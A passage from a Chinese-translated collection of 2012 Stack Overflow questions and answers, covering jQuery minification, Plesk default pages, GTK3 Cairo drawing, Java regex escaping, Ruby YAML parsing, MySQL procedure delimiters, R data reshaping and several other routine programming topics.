如果我将这个混淆代码放在脚本标记中，它不起作用是否有任何其他参考我应该为混淆 jquery 添加。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:23:46.413

为什么要混淆它？

除了使代码更长并且可能更脆弱之外，代码应该很容易进行逆向工程。

这是一个非常没有意义的运动......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:23:55.033

像这样混淆你的代码似乎没用，并且会增加文件大小（对用户不利）。[使用http://jsbeautifier.org/](http://jsbeautifier.org/)之类的工具可以轻松地对您的代码进行非混淆处理。为什么不只是缩小？您的代码，缩小后，将是这样的：

```
$(document).ready(function(){$("a").click(function(a){alert("Thanks for visiting!")})}) 
```

# plesk - 在 Plesk 中将页面设置为默认页面

> ID：10270078
> 
> 赞同：5
> 
> 时间：2012-04-22T17:05:47.637
> 
> 标签：plesk

如何在 Plesk 中将页面设置为默认页面。例如，当有人请求 www.mysite.com 时，它会自动打开 www.mysite.com/Index.html

谢谢

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-23T05:58:34.693

找到它，您首先需要在 Plesk Panael 中转到您的主页，选择虚拟目录，然后选择您的域，然后选择目录属性

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-19T19:33:17.543

或者使用 Web.Config 但推荐的方法是从虚拟目录中使用

```
 <configuration>
       <system.webServer>
          <defaultDocument enabled="true">
             <files>
                <add value="home.html" />
             </files>
          </defaultDocument>
       </system.webServer>
    </configuration> 
```

Apache 通常设置为 index.php 或 index.html

您可以在 linux 服务器上使用 .htaccess 并在 Plesk 网站中设置默认页面

```
DirectoryIndex index.php index.html site-down.php 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T13:23:06.863

这种通过 .htaccess 在 Linux 文件中完成，在 Windows 的 IIS 中进行 URL 重写更改。

喜欢

```
.htaccess 
RewriteEngine On
RewriteCond %{HTTP_HOST} ^example.com$
RewriteRule ^$ http://example.com/index.php [L,R=301] 
```

我希望这有帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-07-26T14:34:09.673

如果网站正在打开 index.html（显示网站托管公司提供的默认页面），并且您希望默认页面由 index.php 控制，请删除（或重命名 index.html），它会自动拾取 index.php作为启动文件。至少它是如何与 Peer 1 一起工作的。

# python - 如何使用 GTK3 和 PyGObject 绘制 GdkPixbuf

> ID：10270080
> 
> 赞同：10
> 
> 时间：2012-04-22T17:05:53.763
> 
> 标签：python, gtk3, pygobject

我有一个小应用程序，它使用 a和`DrawingArea`绘制简单的地图。`PyGObject``GTK3`

我加载一个`Pixbuf`使用

```
from gi.repository import Gtk, GdkPixbuf
pixbuf = GdkPixbuf.Pixbuf.new_from_file_at_size("logo.png", 25, 25) 
```

然后尝试在`DrawingArea`'s draw 事件信号中绘制它

```
def draw(self, widget, context):
    window = widget.get_window()
    ctx = window.cairo_create()
    ctx.set_source_pixbuf(pixbuf, 0, 0) 
```

但我收到错误消息

```
"AttributeError: 'cairo.Context' object has no attribute 'set_source_pixbuf'" 
```

如果我正确阅读[Gtk2 到 Gtk3 迁移指南](http://developer.gnome.org/gtk3/3.3/gtk-migrating-2-to-3.html#id1280341)，这应该可以。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-11T07:16:59.470

新的*绘图*信号使用一个已经将 cairo 上下文作为参数传递的回调，您不需要`window = widget.get_window()`像在 PyGtk 中所做的那样在参加*暴露事件*信号时获取 cairo 上下文。在 PYGObject 中更简单：

```
import cairo

class Foo(object):
    def __init__(self):

       (...)
        self.image = cairo.ImageSurface.create_from_png('logo.png')
       (...)

    def draw(self, widget, context):
        if self.image is not None:
            context.set_source_surface(self.image, 0.0, 0.0)
            context.paint()
        else:
            print('Invalid image')
        return False 
```

也就是说，如果你不需要 PixBuf，但如果你需要它来做其他事情，你有几个选择：

1.  将两个对象都保存在内存中。如果两者都是从 PNG 加载的，那么除了浪费内存之外应该没有太多问题。
2.  将 GdkPixbuf 转换为 PIL 图像，然后将 PIL 图像转换为数据数组，然后使用 create_for_data() 从该数据数组创建 Cairo ImageSurface。牦牛：SI不知道更好，对不起：S
3.  使用hock提出的**Gdk.cairo_set_source_pixbuf() 。**这似乎是在 ImageSurface 中绘制 Pixbuf 的正确方法，但它完全不是 Python 的（这就是为什么我讨厌这种 Introspection 的东西，所有看起来都像 C，就像一个糟糕的 C 端口）。

如果您选择糟糕的第二个选项，方法如下：

```
import Image
import array
from gi.repository import Gtk, GdkPixbuf

width = 25
height = 25
pixbuf = GdkPixbuf.Pixbuf.new_from_file_at_size('logo.png', width, height)
pil_image = Image.fromstring('RGBA', (width, height), pixbuf.get_pixels())
byte_array = array.array('B', pil_image.tostring())
cairo_surface = cairo.ImageSurface.create_for_data(byte_array, cairo.FORMAT_ARGB32, width, height, width * 4) 
```

请注意，**create_for_data()**尚不[适用于 Python3](http://cairographics.org/documentation/pycairo/3/reference/surfaces.html#cairo.ImageSurface.create_for_data)，[仅适用于 Python2](http://cairographics.org/documentation/pycairo/2/reference/surfaces.html#cairo.ImageSurface.create_for_data)。

如果这是您想要实现的目标，请查看我关于如何在 PyGObject 中使用双缓冲区的答案：[在 PyGobject (python3) 中绘图](https://stackoverflow.com/questions/10270795/drawing-in-pygobject-python3)

亲切的问候

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-23T19:48:50.133

以下似乎可以完成这项工作：

```
def draw(self, widget, context):
    Gdk.cairo_set_source_pixbuf(context, self.pixbuf, 0, 0)
    context.paint() 
```

仍然存在一个问题：这是首选的做事方式吗？

# java - JAVA - 正则表达式问题

> ID：10270082
> 
> 赞同：1
> 
> 时间：2012-04-22T17:06:16.690
> 
> 标签：java, regex

只是测试了一些特殊的正则表达式字符并遇到了一些我无法解释的行为。未转义的句号代表任何字符，因此（例如）匹配`3`到`"."`返回`true`，但是，当我匹配`3`到时`"[.]"`，它返回`false`。这是什么原因？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T17:07:52.287

像大多数其他元字符一样，在字符类 (the )`.`中失去了其特殊含义。`[]`在那里，它只是意味着“一个点”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:09:34.017

方格内的“。” 表示句号而不是任何字符。

所以正则表达式“[.]”匹配“。” 而不是“3”。

# ruby-on-rails - 使用 YAML 序列化文本字段的 Ruby 1.9 迁移

> ID：10270083
> 
> 赞同：1
> 
> 时间：2012-04-22T17:06:20.330
> 
> 标签：ruby-on-rails, ruby, yaml

我正在从 ruby​​ 1.8.7 升级到 ruby​​ 1.9.3。我注意到读取 YAML 序列化字段的方式有所不同。我的许多序列化字符串都被强制转换为新 YAML 格式的整数。例如：

```
1.8.7 :010 > "2011_01".to_yaml
 => "--- 2011_01\n" 
1.8.7 :011 > YAML.load("--- 2011_01\n")

1.9.3p125 :001 > YAML.load("--- 2011_01\n")
 => 201101 
```

这是什么原因造成的？有没有办法在新的 ruby​​ 中恢复到旧的行为，或者将我的字段迁移到新的格式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:38:26.027

尝试`syck`用作解析器：

```
ruby-1.9.3-rc1 :001 > YAML::ENGINE.yamler = "syck"
 => "syck" 
ruby-1.9.3-rc1 :002 > YAML.load("--- 2011_01\n")
 => "2011_01" 
```

# c# - Facebook Graph API 电子邮件字段出现问题

> ID：10270085
> 
> 赞同：0
> 
> 时间：2012-04-22T17:06:32.700
> 
> 标签：c#, facebook, facebook-graph-api, facebook-c#-sdk

今天早上早些时候，我从 Facebook 获取用户电子邮件地址的代码运行良好，但现在它返回除了用户电子邮件之外的所有**内容**。

我使用 Facebook C# SDK 获取字段。我有适当的权限来检索电子邮件。

其他开发人员的类似问题：

*   [https://developers.facebook.com/bugs/391841610855516](https://developers.facebook.com/bugs/391841610855516)
*   [https://developers.facebook.com/bugs/365297990174802](https://developers.facebook.com/bugs/365297990174802)

我尝试使用 Facebook Developer 的 Graph API Explorer 来测试 json 返回字段，但它也缺少电子邮件字段。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-28T08:25:59.957

我在浏览了 SO Q&A 后解决了这个问题，这里是遇到同样问题的任何人的解决方案。

显然我们使用了一个已弃用的权限 url 字符串：

```
var parameters = new Dictionary<string, object>();
parameters.Add("permission", "email,more_permissions,blah,blah"); 
```

并且应该一直使用这个：

```
var parameters = new Dictionary<string, object>();
parameters.Add("scope", "email,more_permissions,blah,blah"); 
```

# java - eclipse中的多个标记错误

> ID：10270096
> 
> 赞同：0
> 
> 时间：2012-04-22T17:07:54.583
> 
> 标签：java, eclipse, markers

我有一个用于 web Crowler 的 java 文件。这给了我错误，比如 line 上的多个标记和一些 line number 。

我刚刚学习了模式和匹配器。所以我无法纠正错误。

我的代码是

```
 import java.awt.*;
 import java.awt.event.*;
 import java.io.BufferedReader;
 import java.awt.*;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.URL;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.regex.PatternSyntaxException;

 class initComponents extends Frame implements ActionListener {

      // TextField addt  ,factorialt,concatt1,concatt2,lengtht,palindromet,comparet1,comparet2,substringt1,substringt2;
    //Button add1,factorial1,concat1,length1,palindrome1,compare1,substring1;
 String s1="";
//String s3="";
//String s4="";
//String s2="";
 Button Search,Clear;
 TextField text1;
 TextArea text2;
Label lab,lab1,lab2;

public initComponents()
{
        MyWindowAdapter1 m=new MyWindowAdapter1(this);
        addWindowListener(m);

        setTitle("Web Crawler");
        setLayout(null);
        setSize(1000,1000);
        setVisible(true);

        setBackground(Color.LIGHT_GRAY);

        lab=new Label("Name: ");
        text1=new TextField(20);
        //text2=new TextArea(80,80);
        text2=new TextArea();

       //lab1=new Label("Count");
       //lab2=new Label(); 

        Search=new Button("Search");
        Clear=new Button("Clear");

        lab.setBounds(50,50,80,20);
        //lab1.setBounds(500,50,80,20);
        //lab2.setBounds(590,50,250,20);

        text1.setBounds(140,50,250,20);
        Search.setBounds(50,100,80,20);
        Clear.setBounds(150,100,80,20); 
        text2.setBounds(50, 200, 700, 500);
        //text2.setBounds(200,100,80,20);

        add(lab);
        add(text1);
        //add(lab1);
        //add(lab2);
        add(Search);
        add(Clear);
        add(text2);

        setVisible(true);
        setSize(800,800);

        Search.addActionListener(this);
        Clear.addActionListener(this);

}

 public void actionPerformed(ActionEvent a) 
  {
// TODO Auto-generated method stub

if(a.getSource().equals(Clear))
{
    text1.setText("");
    text2.setText("");
    //text2.append("");
}

    if(a.getSource().equals(Search))
    {
        s1=text1.getText();

        text2.setText("");
        //text2.append();
        //web_crawler c=new web_crawler();

        //c.crawling(s1);

        try{
             InputStreamReader in = new InputStreamReader(new URL(s1).openStream());
             StringBuilder input = new StringBuilder();

             int ch;

             while ((ch = in.read()) != -1) 
                 input.append((char) ch);

             String patternString = "<a\\s+href\\s*=\\s*(\"[^\"]*\"|[^\\s>])\\s*>";

             String abc=((?<html>(href|src)\s*=\s*")|(?<css>url\())(?<url>.*?)(?(html)"|\));  **// here is error**
             Pattern pattern = Pattern.compile(abc, Pattern.CASE_INSENSITIVE);
             Matcher matcher = pattern.matcher(input);
             int count=0;
             String abc="";

             System.out.println(pattern);
             System.out.println(matcher.toString());

             while (matcher.find()) 
             {

                 int start = matcher.start();
                 int end = matcher.end();
                 String match = input.substring(start, end);

                 //match.matches();
             //jTextArea1.append(match);
             //jTextArea1.append("\n");

                 //String[] tokens=match.split(" ");

                 //System.out.println(tokens[0].toString());

                 text2.append(match);
                 text2.append("\n");
             }

            }
            catch (IOException e) 
            {
             e.printStackTrace();
            }
            catch (PatternSyntaxException e)
            {
             e.printStackTrace(); 
            }

    } 
```

}

}

```
 class MyWindowAdapter1 extends WindowAdapter{
initComponents mf;
public MyWindowAdapter1(initComponents mf){
this.mf=mf;
}

public void windowClosing(WindowEvent we)
  {
      System.exit(0);
 } 
 } 
```

它给出了类似的错误

```
 Exception in thread "AWT-EventQueue-0" java.lang.Error: Unresolved compilation problems: 
Syntax error on token "?", new expected
Syntax error on token ">", Type expected after this token
Syntax error on token "Invalid Character", invalid AssignmentOperator
Syntax error on token "Invalid Character", delete this token
Syntax error on tokens, Expression expected instead

at initComponents.actionPerformed(initComponents.java:115)
at java.awt.Button.processActionEvent(Unknown Source)
at java.awt.Button.processEvent(Unknown Source)
at java.awt.Component.dispatchEventImpl(Unknown Source)
at java.awt.Component.dispatchEvent(Unknown Source)
at java.awt.EventQueue.dispatchEventImpl(Unknown Source)
at java.awt.EventQueue.access$000(Unknown Source)
at java.awt.EventQueue$3.run(Unknown Source)
at java.awt.EventQueue$3.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
at java.awt.EventQueue$4.run(Unknown Source)
at java.awt.EventQueue$4.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
at java.awt.EventQueue.dispatchEvent(Unknown Source)
at java.awt.EventDispatchThread.pumpOneEventForFilters(Unknown Source)
at java.awt.EventDispatchThread.pumpEventsForFilter(Unknown Source)
at java.awt.EventDispatchThread.pumpEventsForHierarchy(Unknown Source)
at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
at java.awt.EventDispatchThread.run(Unknown Source) 
```

请帮我。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T17:27:56.053

您需要在文字周围添加引号并添加正确的转义序列。您还两次声明 String abc ：

```
String abc=((?<html>(href|src)\s*=\s*")|(?<css>url\())(?<url>.*?)(?(html)"|\));  **// here is error**
Pattern pattern = Pattern.compile(abc, Pattern.CASE_INSENSITIVE);
Matcher matcher = pattern.matcher(input);
int count=0;
String abc=""; **redeclaration here** 
```

将其更改为：

```
String abc="((?<html>(href|src)\\s*=\\s*\")|(?<css>url\\())(?<url>.*?)(?(html)\"|\\))";
Pattern pattern = Pattern.compile(abc, Pattern.CASE_INSENSITIVE);
Matcher matcher = pattern.matcher(input);
int count=0;
abc=""; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:21:20.933

```
String abc="((?<html>(href|src)\\s*=\\s*\")|(?<css>url\\())(?<url>.*?)(?(html)\"|\\))";
// **here should be no more error** 
```

问题是您忘记了引号，您应该转义字符串中的反斜杠和引号。

# php - 具有多个名称的模型

> ID：10270098
> 
> 赞同：0
> 
> 时间：2012-04-22T17:08:15.033
> 
> 标签：php, code-generation, fuelphp

如何在不创建子目录的情况下生成具有多个名称的模型？

以下：

```
oil g model test_test name:string 
```

创建：

```
Creating model: /web/dev/fuel/app/classes/model/test/test.php
Creating migration: /web/dev/fuel/app/migrations/010_create_test_tests.php 
```

但我想创建：

```
Creating model: /web/dev/fuel/app/classes/model/test_test.php
Creating migration: /web/dev/fuel/app/migrations/010_create_test_tests.php 
```

谢谢，

富有的

**更新**

我被告知你不能在 FuelPHP 类名中使用下划线，如果你这样做，自动加载器将不会加载它。所以，我想问题是：

具有多个单词的 FuelPHP 类的正确命名约定是什么？这种命名约定可以用油来表达吗？

**更新 2**

FuelPHP 编码标准（http://docs.fuelphp.com/general/coding_standards.html）有以下语句：

> 不鼓励使用 camelcase，但在某些情况下，如果将类放在子目录中没有意义，则无法阻止。

这句话似乎接受了在某些情况下可能使用驼峰式大小写的可能性，但我无法相信一个包含多个单词的类名是这样的边缘场景。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T20:29:42.053

它在[编码约定](http://docs.fuelphp.com/general/coding_standards.html#/naming_conventions)中：

> 类名应使用下划线分隔单词，并且类名中的每个单词都应以大写字母开头。但是，在自动加载期间，下划线将被转换为目录分隔符。不鼓励使用 camelcase，但在某些情况下，如果将类放在子目录中没有意义，则无法阻止。

或者正如我们在[2.0（正在进行的工作）的编码约定中](https://github.com/fuelphp/fuelphp/wiki/Coding-Standards)所说的那样：

> 类名应该使用 PascalCase 和下划线分隔的单词的组合。下划线在自动加载器中变成目录分隔符，并且应该总是有意义的。不要将它们用作单词分隔符，当您需要多个单词来描述类时应该使用 PascalCase。

# c - 传递函数指针的参数

> ID：10270104
> 
> 赞同：1
> 
> 时间：2012-04-22T17:08:35.093
> 
> 标签：c, hashtable, function-pointers

我应该通过哈希表（指向数据链表的指针数组）和一些支持函数（即插入元素、删除表）编写 C++ STL 容器映射（关联数组）的 C 实现......我已经成功编写了所有这些，除了一个，它是`foreach(table, function_ptr)`函数，它为表中的所有数据调用传递的函数（打印内容......）。

我有点卡在这里，因为我不知道应该传递什么参数`function_ptr`，所以它是通用的。就目前而言，我认为这是不可能的。

如果我只想将指针传递给 printf，这很容易，原型`foreach`看起来像这样

```
foreach(table_t *t, int (*function_ptr)(const char *fmt, ...)) 
```

我会为每个这样的数据节点调用它

```
function_ptr("%s, %d\n", node.key, node.data) 
```

但是如果我使用它并且有一天改变主意，我想传递我自己的函数，我将不得不更改调用函数的代码和`foreach`函数。

有没有简单的方法来做这样的事情？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T17:15:12.463

指定“任何参数类型”的传统方法是使用`void *`这样的：

```
foreach(table_t *t, int (*function_ptr)(void *p)) 
```

然后你可以传递每个参数的地址（可能是一个复杂的数据类型，比如一个结构），函数可以将它转换回适当的类型：

```
struct {
  int x;
  int y;
} numbers;

// Sums the numbers in a structure
int sum(void *p) {
  numbers *n = (numbers *) p;  // Cast back to the correct type
  return n->x + n->y;
}

// Counts the number of 'a' chars in a string
int numberOfA(void *p) {
  char *s = (char *) p;
  int num = 0;
  while (s != NULL && *s != '\0') {
    if (*s == 'a') {
      ++num;
    }
  }
} 
```

# javascript - 删除子div

> ID：10270114
> 
> 赞同：0
> 
> 时间：2012-04-22T17:09:52.450
> 
> 标签：javascript, jquery

我有 div 列表，我想要实现的是删除 child`<div class="lol">999</div>`并将其替换为`<div class="lol">111</div>`.

我确实知道如何获得他们两个的数据方块。我尝试使用 `$(this).removeClass('column div');` ，但效果不佳。

之前访问[http://jsfiddle.net/jm4eb/5/](http://jsfiddle.net/jm4eb/5/) ：

```
<div class="column" data-square="1-4">
<div class="green">999</div>
</div>

<div class="column" data-square="1-5">
<div class="blue">111</div>
</div> 
```

后

```
<div class="column" data-square="1-4">

</div>

<div class="column" data-square="1-5">
<div class="green">999</div>
</div> 
```

* * *

嗨，这就是应用程序的工作方式。假设有 10 个 div 框，每个框都有一个内框 12 ，用户单击一个 div 并单击另一个。所以点击的第二个 div 的内部 div 应该被删除，并替换为第一个 div 点击的 div 的内部。但他们拥有的外部 div 唯一的唯一字段是 data-square 。访问[http://jsfiddle.net/jm4eb/11/](http://jsfiddle.net/jm4eb/11/)所以当第一个div的内部div而不是第二个div的内部div点击时。第二个div的内部div在替换之前被删除

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:25:50.763

如何更改文本值而不是删除然后创建一个新值？

```
$( '.column' ).each( function () {

    // Save $( this ) and $( this ).next() since we're going to use them multiple times
    var self = $( this ),
        next = self.next()

    // For each of them, save the firstChild's text
    var val = self.children().first().text()

    // Now, check if the next DIV exists
    if ( next ) {

        // If it does, change the text of its first child with the "val" variable
        next.children().first().text( val )
    }
} ) 
```

编辑：替换`.find( '>:first-child' )`为`.children().first()`. 不敢相信 jQuery 没有 shim 的方法`firstElementChild`。

@Esailija 还认为缺少这种方法很奇怪。于是他创建了一个[jQuery 插件](https://chat.stackoverflow.com/transcript/message/3402636#3402636)。这意味着我可以使用`self.firstChild().text()`而不是`self.children().first().text()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:56:16.917

如果我理解正确，您希望将 div 用户的内容放在他们点击的第二个 div 上。由于您已经选择了有问题的 dv（通过他们的点击）并且您拥有它的数据方块，因此只需复制 html。例如： http: [//jsfiddle.net/jm4eb/6/](http://jsfiddle.net/jm4eb/6/)如果要清空第一个 div 的内容，只需`.html("")`在第一次单击时添加，或者保存对单击的 div 的引用并在单击`.html("")`时在保存的引用上运行第二次。

我错过了你的问题吗？

# jquery - 使用 jQuery 滚动到灯箱 div 的顶部

> ID：10270116
> 
> 赞同：0
> 
> 时间：2012-04-22T17:09:58.540
> 
> 标签：jquery, css, jquery-ui, dialog

我有一个 jQueryUI 对话框，其内容超过了默认高度（因此它在对话框中滚动），底部有一个提交按钮。我正在使用 ajaxstart 显示加载屏幕，但由于对话框滚动，您看不到加载 div，除非我单击按钮并手动滚动到顶部。

我希望能够在单击事件的对话框中滚动到 div 的顶部。我尝试了以下代码（但没有成功）：

```
#loading {
z-index: 200;
display:none;
position:absolute;
left:0px;
top:0px;
width:100%;
height:100%;
background-color:#000000;

/* Theoretically for IE 8 & 9 (more valid) */
/* ...but not required as filter works too */
/* should come BEFORE filter */
-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=50)";

/* This works in IE 8 & 9 too */
/* ... but also 5, 6, 7 */
filter: alpha(opacity=70);

/* Older than Firefox 0.9 */
-moz-opacity:0.5;

/* Safari 1.x (pre WebKit!) */
-khtml-opacity: 0.5;

/* Modern!
/* Firefox 0.9+, Safari 2?, Chrome any?
/* Opera 9+, IE 9+ */
opacity: 0.5;
 }

 // jQuery Script:
 $("input[name='docSubmit']").click(function() {
            var height = $("#attendeeManual").height();
            $("#loading").css("height",height);
            $('html, body').animate({scrollTop:$('#attendeeManual').offset().top - 20}, 'slow');
        }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T09:29:17.030

根据**Ohgodwhy**的建议，一个简单`$("#div").scrollTop(0)`的将您带到 div 的最顶部。我读过这可以是动画的，但为了我的目的，我只需要它返回顶部，没有别的 :) 谢谢！

# mysql - 无法将 mysql 数据导出到 godaddy 服务器 - 显示语法错误

> ID：10270118
> 
> 赞同：0
> 
> 时间：2012-04-22T17:10:15.030
> 
> 标签：mysql, mysqldump, mysql-error-1064

这是我的程序：

```
CREATE DEFINER=`root`@`localhost` PROCEDURE `RPTtempreceipts`(
IN vRCPTNO VARCHAR(20))
BEGIN
DECLARE vBNo VARCHAR(20);
DECLARE vPtyCde INTEGER DEFAULT 0;
DECLARE vWMC VARCHAR(20);
DECLARE vPrdCde VARCHAR(10);
DECLARE vBcde CHAR(5);
DECLARE vSAPLID INTEGER DEFAULT 0;

-- Assign Values
SELECT T.BNo,T.pty_code,T.WMC,T.PrdCde,T.Bcde INTO 
vBNo,vPtyCde,vWMC,vPrdCde,vBcde FROM
tbltransaction T INNER JOIN tbltransreceipts TR
ON T.BNo=TR.BNo WHERE TR.RcptNO=vRCPTNO;

SELECT SAPLID INTO vSAPLID FROM tblcust_prd_wor WHERE pty_code=vPtyCde;

-- Select Queries are configured as for Typed Dataset under DT's
SELECT * FROM tbltrans WHERE BNo=vBNo;
SELECT * FROM tbltransrcpt WHERE RNo=vRCPTNO;
END 
```

显示以下错误：

> 错误代码：1064 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的“DECLARE vPtyCde INTEGER”附近使用正确的语法（耗时 328 毫秒）
> 
> 错误代码：1064 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的“DECLARE vWMC VARCHAR(20)”附近使用正确的语法（耗时 312 毫秒）
> 
> 错误代码：1064 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的“DECLARE vPrdCde VARCHAR(10)”附近使用正确的语法（耗时 328 毫秒）
> 
> 错误代码：1064 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的“DECLARE vBcde CHAR(5)”附近使用正确的语法（耗时 313 毫秒）
> 
> 错误代码：1064 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的“DECLARE vSAPLID INTEGER DEFAULT 0”附近使用正确的语法（耗时 297 毫秒）
> 
> 错误代码：1327 未声明的变量：vBNo（占用 312 毫秒）
> 
> 错误代码：1327 未声明的变量：vSAPLID（耗时 297 毫秒）

我对此感到困惑，因为它在本地主机中工作正常。现在我完成了项目并喜欢将数据库上传到服务器。但是这些错误阻止了我继续前进......请帮助我。

问候，森萨。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:38:04.593

phpMyAdmin 在每个`;`.

这篇文章解释了如何避免这种情况：http: [//blog.nth-design.com/2009/02/25/creating-sp-in-phpmyadmin/](http://blog.nth-design.com/2009/02/25/creating-sp-in-phpmyadmin/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-23T19:39:39.407

正如 DCoder 所说，您使用的分隔符“;” 导致问题。您需要将分隔符更改为不会出现在查询中的任何内容。博客文章中的“$$”示例很可能是安全的，因为双美元符号不太可能出现在许多地方。

您需要确保您的数据库是 5.0 或更高版本的 MySQL 数据库，因为过程仅在 5.0 中启动。

此外，定义 root@localhost 不适用于 Go Daddy 共享主机。您应该能够摆脱该部分或使用 dbuser@'%'。

# android - 我应该为哪些 Android 设备架构构建我的应用程序？

> ID：10270126
> 
> 赞同：2
> 
> 时间：2012-04-22T17:10:51.207
> 
> 标签：android, arm, xamarin.android

适用于 Android 的 Mono 为我提供了 3 个关于我的应用程序应针对哪些设备构建的选项：

*   阿米亚比
*   armeabi-v7a
*   x86

我应该为什么架构构建我的应用程序？如果我只是为 armeabi 构建我的应用程序，究竟会发生什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:40:18.123

这实际上取决于您需要支持哪些终端设备。

[http://docs.xamarin.com/android/advanced_topics/architecture](http://docs.xamarin.com/android/advanced_topics/architecture)上的解释是：

> 包含 Mono 运行时的本机库位于 .apk 中。Mono for Android 应用程序必须包含所需/目标 Android 架构的本地库，例如 armeabi、armeabi-v7a、x86。Mono for Android 应用程序不能在平台上运行，除非它包含适当的运行时库。

因此，例如，如果您想处理 x86 Android VM（或 Google TV），那么您的 apk 将需要包含 x86 本机 Mono 库。

# r - 新的重叠变量

> ID：10270133
> 
> 赞同：-2
> 
> 时间：2012-04-22T17:12:15.333
> 
> 标签：r, plyr, data-management

我不知道给这个取什么标题。

我有一个关于人员、年份和活动的数据集

```
df <- data.frame("id" = c("1", "1", "1", "2", "2","3"), "years" = rep(1971, 6),
                      "activity" = c("a","b","c","d","e","e"))
  id years activity
1  1  1971        a
2  1  1971        b
3  1  1971        c
4  2  1971        d
5  2  1971        e
6  3  1971        e 
```

我想结合年份和活动列，但是对于每一年，在原始年份列中，我想生成 +/- 3 年，同时保留与 id 的关联

如果我分两步执行此操作： 对于 id "1"，原始年份是 1971 年，因此 ID 1 的 +/-3 年将导致：

```
 id   all_years 
 1    1968
 1    1969
 1    1970
 1    1971
 1    1972
 1    1973
 1    1974 
```

在第 2 步中，我想将此 all_years 列与原始 df 中的活动列结合起来，保留 id。所以 id "1" 有 3 个活动 (a,b,c) 和 7 年 (1968:1964)，所以 id "1" 将在新的组合列中出现 10 次。

所以最终，我会得到这样的结果：

```
 id   year_and_activities 
  1    a
  1    b
  1    c
  1    1968
  1    1969
  1    1970
  1    1971
  1    1972
  1    1973
  1    1974
  2    d
  2    e
  2    1968
...
  2    1974
...
  3    e
... 
```

一如既往，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T07:33:43.537

我无法真正理解您的问题，但是鉴于初始数据框，您可以使用以下方法获取最终数据框`melt`：

```
require(reshape2)

##To get your +/- 3
dd = data.frame(id=df$id, activity=df$activity,
   years=df$years- rep(-3:3, nrow(df)))

##Pretty much gives you what you want
df_melt = melt(dd, id=1)

##Remove the unnecessary column
df_melt = df_melt[,c(1,3)]
##Rename 
colnames(df_melt) = c("id","year_and_activities")

##Order the column
df_melt[with(df_melt, order(id, year_and_activities)),] 
```

顺便说一句，我建议将列作为“字符”和“年”的混合可能是一个坏主意 - 但您可能有充分的理由。

# java - Java 最快的哈希函数

> ID：10270137
> 
> 赞同：3
> 
> 时间：2012-04-22T17:12:36.510
> 
> 标签：java, hash, hash-function

我有一个长度为 128 个字符的布尔字符串（如“01100..001”）（表示 0/1 的 128 个数字）。我在 Java 中寻找一个高效（快速）的散列函数，它产生的表示比 128 位低得多，而且显然冲突更少。任何人都可以帮助我，有没有这样的哈希函数？有什么建议吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-22T17:21:33.043

您是否考虑过使用 a`java.util.BitSet`代替，这取决于您在做什么，它可能会更容易和更有效？[http://docs.oracle.com/javase/6/docs/api/java/util/BitSet.html](http://docs.oracle.com/javase/6/docs/api/java/util/BitSet.html) 它也有一个`.hashCode()`方法。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-22T17:14:44.530

尝试`.hashCode()`在 Java`String`类上使用该方法，它返回一个`int`并且速度非常快。

或者，如果您更喜欢将数据存储`.hashCode()`在.`java.util.BitSet``BitSet`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T17:27:21.133

如果需要计算一个字符串的哈希值，只需使用类的[`hashCode()`](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#hashCode%28%29)方法即可`String`。根据实现，为快速计算此值进行了多项优化。

例如，在[OpenJDK](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b14/java/lang/String.java)的`String`类实现中，该`hashCode()`方法缓存`hash`属性中的值，并且只需要计算一次。

谁说 128 个字符的字符串具有 128 位的哈希值？Java 中方法返回的所有哈希`hashCode()`都是 类型`int`，Java 中的 int 使用 32 位表示。

# android - 为什么食谱在似乎没有必要时提倡覆盖 getItemViewType 和 getViewTypeCount？

> ID：10270143
> 
> 赞同：7
> 
